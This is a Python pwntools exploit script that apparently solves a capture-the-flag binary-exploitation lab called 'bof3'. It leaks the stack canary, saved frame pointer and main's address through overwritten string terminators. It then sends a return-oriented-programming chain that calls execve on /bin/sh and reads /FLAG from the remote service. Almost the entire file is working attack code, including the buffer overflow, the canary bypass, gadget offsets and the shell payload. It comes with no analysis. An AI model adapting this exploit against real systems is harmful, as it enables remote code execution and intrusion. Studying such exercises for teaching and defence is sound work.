#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# read the canery and write the msg_ptr & canery back at the same time

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

exe = './bof3'
port = 10261

elf = ELF(exe)
off_main = elf.symbols[b'main']
base = 0
qemu_base = 0

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)

# get canary
payload = 'A' * (0x28) + '?'
garbo = r.recvuntil('name? '.encode())
r.send( payload.encode())
given = r.recvline()
# print( given.split(b'?')[1][:7].ljust( 8, b'\x00'))
# print( len(given.split(b'?')[1][:7].ljust( 8, b'\x00')))
canary = u64( given.split(b'?')[1][:7].ljust( 8, b'\x00'))
canary = canary << 8
print( "canary: " + hex(canary))

# get rbp
payload = 'A' * (0x30 - 1) + '?'
garbo = r.recvuntil('number? '.encode())
r.send( payload.encode())
given = r.recvline()
rbp = u64( given.split(b'?')[1][:-1].ljust( 8, b'\x00'))
print( "rbp: " + hex(rbp))


# get main address
payload = 'A' * (0x38 - 1) + '?'
garbo = r.recvuntil('name? '.encode())
r.send( payload.encode())
given = r.recvline()
main = u64( given.split(b'?')[1][:-1].ljust( 8, b'\x00'))
print( "main given: " + hex(main))


# write shellcode with rop
"""
0x000000000008dd8b : pop rdx ; pop rbx ; ret
0x000000000000917f : pop rdi ; ret
0x00000000000111ee : pop rsi ; ret
0x0000000000057187 : pop rax ; ret
0x0000000000008f34 : syscall


0x000000000000801a : ret
0x000000000007bfc5 : and esi, 0x80 ; syscall // another syscall possibility
0x000000000007ce94 : mov eax, eax ; syscall
0x000000000005e493 : int 0x80
"""

codes = """
    xor rax, rax
    push rax
    mov rsi, rsp

    mov rax, 0x68732f6e69622f
    push rax
    mov rdi, rsp

    mov rax, 0x3b
    mov rdx, rsi
    syscall

    mov rdi, 0x0
    mov rax, 60
    syscall
"""
dummy = 0x0

pop_rdx_pop_rbx = main - 0x8ad0 + 0x08dd8b
pop_rdi = main - 0x8ad0 + 0x917f
pop_rsi = main - 0x8ad0 + 0x0111ee
pop_rax = main - 0x8ad0 + 0x057187
syscall = main - 0x8ad0 + 0x8f34
# ret = main - 0x8ad0 + 0x801a

payload = b'/bin/sh\0\0' + b'A' * (0x28 - len("/bin/sh\0\0")) + p64( canary) + p64(dummy) + \
                                                                p64( pop_rdx_pop_rbx) + p64( 0x0) + p64(dummy) + \
                                                                p64( pop_rdi) + p64(rbp - 0x40) + \
                                                                p64( pop_rsi) + p64(0x0) + \
                                                                p64( pop_rax) + p64(59) + p64(syscall)
garbo = r.recvuntil('message: '.encode())
r.send( payload)

# remove all the garbage
garbo = r.recvuntil('you!\n'.encode())

# read file
cat_comm = 'cat /FLAG\n'
r.sendline( cat_comm.encode())
given_flag = r.recv().decode()
r.close()
print( given_flag[:-1])

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
